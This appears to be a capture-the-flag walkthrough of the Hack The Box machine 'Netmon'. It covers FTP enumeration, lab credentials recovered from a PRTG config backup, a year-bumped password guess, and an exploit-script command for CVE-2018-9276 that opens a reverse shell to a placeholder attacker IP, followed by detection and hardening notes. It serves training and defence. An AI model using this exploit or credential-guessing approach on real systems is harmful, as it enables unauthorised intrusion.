**Netmon**
**Summary**

Netmon is a Windows machine running PRTG Network Monitor. Initial access was achieved via anonymous FTP access, exposing configuration backups with credentials. A password pattern allowed successful login, and an authenticated RCE exploit led to a SYSTEM shell.

Platform
Platform: Hack The Box
OS: Windows
Difficulty: Easy
Focus Areas:
FTP Enumeration
Credential Discovery
Config File Analysis
Known Exploit Usage
Skills Demonstrated
Enumeration (Nmap, FTP)
Credential harvesting
Password pattern analysis
Exploitation (CVE-2018-9276)
Post-exploitation validation
Tools Used
Nmap
FTP
Netcat
Exploit script (PRTG RCE)
Reconnaissance
sudo nmap -sSV -A -p- --open -Pn $IP -oA Netmon
🔎 Initial Scan Results

Key Observations:

FTP (21) → Anonymous login allowed
HTTP (80) → PRTG Network Monitor
SMB (445) → Windows host
🔎 Deep Service Enumeration




Important Finding:

PRTG version exposed → 18.1.37.13946
Enumeration
📂 FTP Access
ftp $IP

Key Finding:

Anonymous login allowed
Full filesystem visibility
📁 Directory Exploration

Navigated to:

ProgramData\Paessler\PRTG Network Monitor\
📥 File Extraction

Downloaded configuration files:

🔐 Credential Discovery

Inside config file:

Recovered:

User: prtgadmin
Password: PrTg@dm1n2018
💡 Password Pattern Recognition

Tried updated year:

PrTg@dm1n2019 ✅
Initial Access
🌐 PRTG Login

Successfully authenticated as:

prtgadmin / PrTg@dm1n2019
Exploitation
⚡ Vulnerability Identified
Version: 18.1.37.13946
Vulnerability: CVE-2018-9276
Type: Authenticated RCE
🚀 Exploit Execution
./exploit.py -i <IP> -p 80 \
--lhost <ATTACKER_IP> --lport 4444 \
--user prtgadmin --password 'PrTg@dm1n2019'

📡 Reverse Shell Triggered

Privilege Escalation
🧠 Already SYSTEM
whoami

Proof
🏁 Root Flag
type root.txt

Key Takeaways
Anonymous FTP = 🚨 high risk
Config backups often contain plaintext credentials
Password patterns (years!) are extremely common
Always check software version → public exploits
Some boxes are about clean execution, not complexity
Detection / Hardening Notes
🔍 Detection
Anonymous FTP access logs
Config file access monitoring
Suspicious login attempts
DLL execution / abnormal processes
Reverse shell traffic
🔒 Hardening
Disable anonymous FTP
Protect config backups
Enforce strong password policies
Patch PRTG
Restrict outbound traffic
